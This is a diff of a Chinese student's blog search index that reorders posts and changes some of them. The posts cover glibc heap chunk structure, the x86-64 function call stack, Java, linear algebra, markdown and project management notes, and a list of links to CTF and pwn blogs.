-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<h4 id="bin是什么">bin是什么</h4>
-<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
-]]></content>
-      <categories>
-        <category>CTF!</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>位运算</title>
     <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
     <content><![CDATA[<p>位运算基础概念以及题目：</p>
@@ -559,130 +545,18 @@
       </tags>
   </entry>
   <entry>
-    <title>大二上java程序设计期末复习</title>
-    <url>/2022/11/29/%E5%A4%A7%E4%BA%8C%E4%B8%8AJava%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>整理了一下ppt的内容，java程序设计课程的课件。</p>
-<h1>软件开发(Software Development)</h1>
-<h2 id="Agile-Methodologies（敏捷方法）">Agile Methodologies（敏捷方法）</h2>
-<p>这是一种快速部署应用程序的理念，优点包括：</p>
-<ul>
-<li>
-<p>persistent software delivery 持续提交软件</p>
-</li>
-<li>
-<p>increased stakeholder satisfaction 增加利益方的满意度</p>
-</li>
-<li>
-<p>inspect and adapt 检查调整</p>
-</li>
-<li>
-<p>welcome to changes at any stage 支持任意阶段修改</p>
-</li>
-<li>
-<p>design is important 设计至关重要</p>
-</li>
-<li>
-<p>daily interaction 日常互动</p>
-</li>
-</ul>
-<h2 id="版本控制（version-control）">版本控制（version control）</h2>
-<p>就是说需要一个git来控制一下版本，对多人合作很方便。而关于这个git的用法可以看看<a href="https://zthlly.github.io/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">这篇博客</a> 。</p>
-<h2 id="JVM">JVM</h2>
-<p>这里多说两句这个JVM，JVM（Java Virtucal Machine）是一个类似虚拟机的玩意，它运行在操作系统之下，通过与操作系统交互达到与硬件交互的目的。知道这个之后我们看看java文件怎么运行，首先写完一个.java文件之后通过编译器编译得到一个.class文件，然后通过类加载器把这个.class丢到JVM里面。这里再多提两句嘴，JVM内主要的五大块：方法区，堆是线程共享区域，有线程安全问题，栈和本地方法栈和计数器是独享区域，不存在线程安全问题。</p>
-<h1>Java语言基础</h1>
-<h2 id="语言基础语法">语言基础语法</h2>
-<p>这个去<a href="https://zthlly.github.io/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="si1v3r的狗窝捏">这里</a>看。</p>
-<h2 id="UML图">UML图</h2>
-<p>呃就是一个类的图形化表示，举个例子吧~</p>
-<p><img src="https://s3.uuu.ovh/imgs/2022/11/29/b41b30ebbe997a4f.png" alt=""></p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-        <tag>复习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>大牛的博客(学习用)</title>
-    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
-    <content><![CDATA[<p>这里收录一些大佬的博客，可以跟着学习：</p>
+    <title>函数调用栈</title>
+    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
+    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
 <span id="more"></span>
-<h2 id="Pwn手师傅们的博客">Pwn手师傅们的博客</h2>
-<p><a href="https://godjj.top/">https://godjj.top/</a></p>
-<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
-<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
-<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
-<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
+<h4 id="函数开始">函数开始</h4>
+<p>如图：</p>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
+<h4 id="函数结束">函数结束</h4>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>线代预习一些知识</title>
-    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
-<span id="more"></span>
-<ul>
-<li>
-<p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
-</li>
-<li>
-<p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
-</li>
-<li>
-<p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
-<h4 id="施密特正交化步骤：">施密特正交化步骤：</h4>
-</li>
-<li>
-<p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
-</li>
-<li>
-<p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$</p>
-</li>
-<li>
-<p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
-<h3 id="一些关于行列式的性质：">一些关于行列式的性质：</h3>
-</li>
-</ul>
-<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
-<ol>
-<li>
-<p>$$|2*A|=2^n*x$$</p>
-</li>
-<li>
-<p>$$|-A|=(-1)^n*x$$</p>
-</li>
-<li>
-<p>$$|A^2|=x^2$$</p>
-</li>
-<li>
-<p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
-</li>
-</ol>
-<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
-<p>矩阵可逆可推出列空间是$R^3$</p>
-<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
-<p>列空间的维数是他的秩</p>
-<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
-<h4 id="克雷默法则">克雷默法则</h4>
-<p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
-<h4 id="公式">公式</h4>
-<p>$$A^-1=\frac{C\tau}{|A|}$$</p>
-<p>$$A*C\tau=|A|*I$$</p>
-<h4 id="特征值与特征向量">特征值与特征向量</h4>
-<p>特征值的和=矩阵左上右下对角线的和</p>
-<p>特征值的乘积等于矩阵的行列式</p>
-<h4 id="对角化">对角化</h4>
-<p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
-<p>X则是特征向量的集合的矩阵</p>
-<p>A是原矩阵</p>
-<p>有公式：</p>
-<p>$$\Lambda=X^-1*A*X$$</p>
-<p>$$A=X^-1*\Lambda*X$$</p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>线性代数</tag>
-      </tags>
   </entry>
   <entry>
     <title>基础算法01</title>
@@ -854,6 +728,132 @@
       </tags>
   </entry>
   <entry>
+    <title>大牛的博客(学习用)</title>
+    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
+    <content><![CDATA[<p>这里收录一些大佬的博客，可以跟着学习：</p>
+<span id="more"></span>
+<h2 id="Pwn手师傅们的博客">Pwn手师傅们的博客</h2>
+<p><a href="https://godjj.top/">https://godjj.top/</a></p>
+<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
+<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
+<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
+<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>大二上java程序设计期末复习</title>
+    <url>/2022/11/29/%E5%A4%A7%E4%BA%8C%E4%B8%8AJava%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p>整理了一下ppt的内容，java程序设计课程的课件。</p>
+<h1>软件开发(Software Development)</h1>
+<h2 id="Agile-Methodologies（敏捷方法）">Agile Methodologies（敏捷方法）</h2>
+<p>这是一种快速部署应用程序的理念，优点包括：</p>
+<ul>
+<li>
+<p>persistent software delivery 持续提交软件</p>
+</li>
+<li>
+<p>increased stakeholder satisfaction 增加利益方的满意度</p>
+</li>
+<li>
+<p>inspect and adapt 检查调整</p>
+</li>
+<li>
+<p>welcome to changes at any stage 支持任意阶段修改</p>
+</li>
+<li>
+<p>design is important 设计至关重要</p>
+</li>
+<li>
+<p>daily interaction 日常互动</p>
+</li>
+</ul>
+<h2 id="版本控制（version-control）">版本控制（version control）</h2>
+<p>就是说需要一个git来控制一下版本，对多人合作很方便。而关于这个git的用法可以看看<a href="https://zthlly.github.io/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">这篇博客</a> 。</p>
+<h2 id="JVM">JVM</h2>
+<p>这里多说两句这个JVM，JVM（Java Virtucal Machine）是一个类似虚拟机的玩意，它运行在操作系统之下，通过与操作系统交互达到与硬件交互的目的。知道这个之后我们看看java文件怎么运行，首先写完一个.java文件之后通过编译器编译得到一个.class文件，然后通过类加载器把这个.class丢到JVM里面。这里再多提两句嘴，JVM内主要的五大块：方法区，堆是线程共享区域，有线程安全问题，栈和本地方法栈和计数器是独享区域，不存在线程安全问题。</p>
+<h1>Java语言基础</h1>
+<h2 id="语言基础语法">语言基础语法</h2>
+<p>这个去<a href="https://zthlly.github.io/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="si1v3r的狗窝捏">这里</a>看。</p>
+<h2 id="UML图">UML图</h2>
+<p>呃就是一个类的图形化表示，举个例子吧~</p>
+<p><img src="https://s3.uuu.ovh/imgs/2022/11/29/b41b30ebbe997a4f.png" alt=""></p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+        <tag>复习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>线代预习一些知识</title>
+    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
+<span id="more"></span>
+<ul>
+<li>
+<p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
+</li>
+<li>
+<p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
+</li>
+<li>
+<p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
+<h4 id="施密特正交化步骤：">施密特正交化步骤：</h4>
+</li>
+<li>
+<p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
+</li>
+<li>
+<p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$</p>
+</li>
+<li>
+<p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
+<h3 id="一些关于行列式的性质：">一些关于行列式的性质：</h3>
+</li>
+</ul>
+<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
+<ol>
+<li>
+<p>$$|2*A|=2^n*x$$</p>
+</li>
+<li>
+<p>$$|-A|=(-1)^n*x$$</p>
+</li>
+<li>
+<p>$$|A^2|=x^2$$</p>
+</li>
+<li>
+<p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
+</li>
+</ol>
+<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
+<p>矩阵可逆可推出列空间是$R^3$</p>
+<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
+<p>列空间的维数是他的秩</p>
+<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
+<h4 id="克雷默法则">克雷默法则</h4>
+<p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
+<h4 id="公式">公式</h4>
+<p>$$A^-1=\frac{C\tau}{|A|}$$</p>
+<p>$$A*C\tau=|A|*I$$</p>
+<h4 id="特征值与特征向量">特征值与特征向量</h4>
+<p>特征值的和=矩阵左上右下对角线的和</p>
+<p>特征值的乘积等于矩阵的行列式</p>
+<h4 id="对角化">对角化</h4>
+<p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
+<p>X则是特征向量的集合的矩阵</p>
+<p>A是原矩阵</p>
+<p>有公式：</p>
+<p>$$\Lambda=X^-1*A*X$$</p>
+<p>$$A=X^-1*\Lambda*X$$</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>线性代数</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记录软院2022年1024解谜</title>
     <url>/2022/11/08/%E8%AE%B0%E5%BD%95%E8%BD%AF%E9%99%A22022%E5%B9%B41024%E8%A7%A3%E8%B0%9C/</url>
     <content><![CDATA[<p>首先是为什么写这篇文章，emmm，就当作是打了一次ctf写的wp吧，写都写了不如就发了(雾</p>
@@ -892,114 +892,6 @@
 <p>梅开二度，盲水印x2得到答案。</p>
 <p>结束！下班！来自一个啥也没干却很累的菜狗的碎碎念…</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>计算机体系结构复习</title>
-    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>大一下预习计算机体系结构</p>
-<span id="more"></span>
-<h4 id="原码反码补码">原码反码补码</h4>
-<ul>
-<li>原码：二进制形式</li>
-<li>反码：原码除符号位不变，其余全部取反</li>
-<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
-</ul>
-<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>计算机原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>markdown基本语法使用</title>
-    <url>/2022/06/15/%E8%BF%99%E6%98%AF%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
-<span id="more"></span>
-<h1>1.粗体和斜体</h1>
-<h1>语法：</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>
-<p>显示效果：</p>
-<ol>
-<li><em>这是一段斜体</em></li>
-<li><strong>这是一段粗体</strong></li>
-<li><em><strong>这是一段加粗斜体</strong></em></li>
-<li><s>这是一段删除线</s></li>
-</ol>
-<h1>2.分级标题</h1>
-<p>语法:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.#一级标题</span><br><span class="line">2.##二级标题</span><br><span class="line">3.###三级标题</span><br><span class="line">4.####四级标题</span><br><span class="line">5.#####五级标题</span><br><span class="line">6.######六级标题</span><br></pre></td></tr></table></figure>
-<p><strong>注意：</strong> 字号一次递减，一级最大。</p>
-<h1>3.超链接</h1>
-<h4 id="第一种">第一种</h4>
-<p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.欢迎滚去[百度一下](https://www.baidu.com/ &quot;百度一下你就知道&quot;)</span><br><span class="line">2.欢迎滚去[百度一下](https://www.baidu.com/)</span><br></pre></td></tr></table></figure>
-<p>1.欢迎滚去<a href="https://www.baidu.com/" title="百度一下你就知道">百度一下</a></p>
-<p>2.欢迎滚去<a href="https://www.baidu.com/">百度一下</a></p>
-<h4 id="第二种">第二种</h4>
-<p>在第一种的基础上可以加上序号方便管理。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.你可以前往[百度][1],[洛谷][2]等地方学习</span><br><span class="line">2.[1]:https://www.baidu.com/ &quot;百度&quot;</span><br><span class="line">3.[2]:https://www.luogu.com.cn/ &quot;洛谷&quot;</span><br></pre></td></tr></table></figure>
-<p>你可以前往<a href="https://www.baidu.com/" title="百度">百度</a>,<a href="https://www.luogu.com.cn/" title="洛谷">洛谷</a>等地方学习</p>
-<h4 id="第三种">第三种</h4>
-<p>这种是直接贴出来的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
-<h1>列表</h1>
-<p><strong>无序列表的表示</strong></p>
-<p>使用*，+，- 表示无序列表</p>
-<p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.- 无序列表一</span><br><span class="line">2.- 无序列表二</span><br><span class="line">3.- 无序列表三</span><br></pre></td></tr></table></figure>
-<p>显示效果：</p>
-<ul>
-<li>无序列表一</li>
-<li>无序列表二</li>
-<li>无序列表三</li>
-</ul>
-<p><strong>有序列表的表示</strong></p>
-<p>直接用一个数字和英文句点就行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. balabala</span><br><span class="line">2. balabala</span><br><span class="line">3. balabala</span><br></pre></td></tr></table></figure>
-<p>显示效果：</p>
-<ol>
-<li>有序列表一</li>
-<li>有序列表二</li>
-<li>有序列表三</li>
-</ol>
-<h5 id="包含引用（虽然我感觉没啥用2333）">包含引用（虽然我感觉没啥用2333）</h5>
-<p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 阅读的方法</span><br><span class="line">	&gt; 打开电灯</span><br><span class="line">	&gt; 打开书本</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<ul>
-<li>
-<p>阅读的方法</p>
-<blockquote>
-<p>打开电灯<br>
-打开书本</p>
-</blockquote>
-</li>
-</ul>
-<h5 id="特殊情况">特殊情况</h5>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>
-<p>emmm,自己注意一下</p>
-<ol>
-<li>1986. what a  great season.</li>
-</ol>
-<h1>公式</h1>
-<p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能守恒方程可以用$E=mc^2$来表达</span><br></pre></td></tr></table></figure>
-<p>效果：$E=mc^2$</p>
-<p>数学符号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尖括号:\langle</span><br><span class="line">上取整:\lceil</span><br><span class="line">下取整:\lfloor</span><br><span class="line">分数:\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">求和:\sum</span><br><span class="line">积分:\int_&#123;下限&#125;^&#123;\infty&#125;后面的括号表示上限，\infty表示无限</span><br><span class="line">极限:\lim_&#123;x\to+\infty&#125;</span><br></pre></td></tr></table></figure>
-<p>极限的效果：$\lim_{x\to +\infty}$</p>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>语法</tag>
-        <tag>markdown</tag>
-      </tags>
   </entry>
   <entry>
     <title>项目管理实施流程</title>
@@ -1221,6 +1113,114 @@
       <tags>
         <tag>项目管理</tag>
         <tag>项目流程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown基本语法使用</title>
+    <url>/2022/06/15/%E8%BF%99%E6%98%AF%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
+<span id="more"></span>
+<h1>1.粗体和斜体</h1>
+<h1>语法：</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>
+<p>显示效果：</p>
+<ol>
+<li><em>这是一段斜体</em></li>
+<li><strong>这是一段粗体</strong></li>
+<li><em><strong>这是一段加粗斜体</strong></em></li>
+<li><s>这是一段删除线</s></li>
+</ol>
+<h1>2.分级标题</h1>
+<p>语法:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.#一级标题</span><br><span class="line">2.##二级标题</span><br><span class="line">3.###三级标题</span><br><span class="line">4.####四级标题</span><br><span class="line">5.#####五级标题</span><br><span class="line">6.######六级标题</span><br></pre></td></tr></table></figure>
+<p><strong>注意：</strong> 字号一次递减，一级最大。</p>
+<h1>3.超链接</h1>
+<h4 id="第一种">第一种</h4>
+<p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.欢迎滚去[百度一下](https://www.baidu.com/ &quot;百度一下你就知道&quot;)</span><br><span class="line">2.欢迎滚去[百度一下](https://www.baidu.com/)</span><br></pre></td></tr></table></figure>
+<p>1.欢迎滚去<a href="https://www.baidu.com/" title="百度一下你就知道">百度一下</a></p>
+<p>2.欢迎滚去<a href="https://www.baidu.com/">百度一下</a></p>
+<h4 id="第二种">第二种</h4>
+<p>在第一种的基础上可以加上序号方便管理。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.你可以前往[百度][1],[洛谷][2]等地方学习</span><br><span class="line">2.[1]:https://www.baidu.com/ &quot;百度&quot;</span><br><span class="line">3.[2]:https://www.luogu.com.cn/ &quot;洛谷&quot;</span><br></pre></td></tr></table></figure>
+<p>你可以前往<a href="https://www.baidu.com/" title="百度">百度</a>,<a href="https://www.luogu.com.cn/" title="洛谷">洛谷</a>等地方学习</p>
+<h4 id="第三种">第三种</h4>
+<p>这种是直接贴出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
+<h1>列表</h1>
+<p><strong>无序列表的表示</strong></p>
+<p>使用*，+，- 表示无序列表</p>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.- 无序列表一</span><br><span class="line">2.- 无序列表二</span><br><span class="line">3.- 无序列表三</span><br></pre></td></tr></table></figure>
+<p>显示效果：</p>
+<ul>
+<li>无序列表一</li>
+<li>无序列表二</li>
+<li>无序列表三</li>
+</ul>
+<p><strong>有序列表的表示</strong></p>
+<p>直接用一个数字和英文句点就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. balabala</span><br><span class="line">2. balabala</span><br><span class="line">3. balabala</span><br></pre></td></tr></table></figure>
+<p>显示效果：</p>
+<ol>
+<li>有序列表一</li>
+<li>有序列表二</li>
+<li>有序列表三</li>
+</ol>
+<h5 id="包含引用（虽然我感觉没啥用2333）">包含引用（虽然我感觉没啥用2333）</h5>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 阅读的方法</span><br><span class="line">	&gt; 打开电灯</span><br><span class="line">	&gt; 打开书本</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<ul>
+<li>
+<p>阅读的方法</p>
+<blockquote>
+<p>打开电灯<br>
+打开书本</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="特殊情况">特殊情况</h5>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>
+<p>emmm,自己注意一下</p>
+<ol>
+<li>1986. what a  great season.</li>
+</ol>
+<h1>公式</h1>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能守恒方程可以用$E=mc^2$来表达</span><br></pre></td></tr></table></figure>
+<p>效果：$E=mc^2$</p>
+<p>数学符号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尖括号:\langle</span><br><span class="line">上取整:\lceil</span><br><span class="line">下取整:\lfloor</span><br><span class="line">分数:\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">求和:\sum</span><br><span class="line">积分:\int_&#123;下限&#125;^&#123;\infty&#125;后面的括号表示上限，\infty表示无限</span><br><span class="line">极限:\lim_&#123;x\to+\infty&#125;</span><br></pre></td></tr></table></figure>
+<p>极限的效果：$\lim_{x\to +\infty}$</p>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>语法</tag>
+        <tag>markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机体系结构复习</title>
+    <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<p>大一下预习计算机体系结构</p>
+<span id="more"></span>
+<h4 id="原码反码补码">原码反码补码</h4>
+<ul>
+<li>原码：二进制形式</li>
+<li>反码：原码除符号位不变，其余全部取反</li>
+<li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
+</ul>
+<p>减法器可以用一个加法器，一个非门，一个VDD组合构成。</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
